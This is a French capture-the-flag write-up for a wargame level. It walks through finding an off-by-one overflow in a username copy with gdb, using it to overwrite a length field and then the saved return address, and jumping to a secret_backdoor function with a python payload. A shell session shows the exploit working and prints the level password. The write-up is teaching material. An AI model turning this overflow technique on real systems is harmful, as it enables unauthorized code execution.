Partial RELRO
No canary found
NX enabled
PIE enabled
No RPATH
No RUNPATH

Pour trouver rapidement l'addresse de base:
(gdb) b *handle_msg+95
(gdb) i r 
-> %rax contiendra notre addresse
ici pour exemple on prend 0x7fffffffe3f0

0x7fffffffe3f0: copie du message (strncpy)
0x7fffffffe3f0+140: copie du username (41 caracteres)
0x7fffffffe3f0+180: longueur strncpy

Le message a une limite de 1024 caracteres.
strncpy copie le message (fgets) jusqu'a une longueur de msg_buffer+180.
(gdb) x/wd 0x7fffffffe3f0+180
0x7fffffffe4a4: 10 // Donc 10 caracteres par defaut

La copie du username contient une erreur. 1 octets en plus est copie et overflow sur 0x7fffffffe3f0+180.

Donc si username <- "A"*40 + "\xff" (255).
Cela ecrasera la longueur initiale, et copiera 255.
Pour preuve, le programme segfault, il y a donc quelque chose a faire.

Le buffer est initialise dans handle_msg(), si on breakpoint dedans, on constate que l'on a reussi a modifier son saved-rip.
Avec un overflow pattern, on trouve l'offset 200.

secret_backdoor(): 0x000055555555488c

(python -c 'print "A"*40 + "\xff" + "\n" + "\x90"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat)

Cela fonctionne !

level09@OverRide:~$ (python -c 'print "A"*40 + "\xff" + "\n" + "\x90"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end

j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE




----------------------------------------
PIE etait active, pourquoi les addresses n'ont pas changes une fois sorti de GDB ?
La randomisation de PIE depend de l'activation de l'ASLR, verifions s'il est activer avec cette commande:
level09@OverRide:~$ cat /proc/sys/kernel/randomize_va_space
0

0 signifie que l'ASLR n'est pas active sur le Systeme.
Un binaire compile avec le flag PIE est donc pres a la randomisation sur un systeme avec l'ASLR, mais PIE ne fera rien sans ASLR.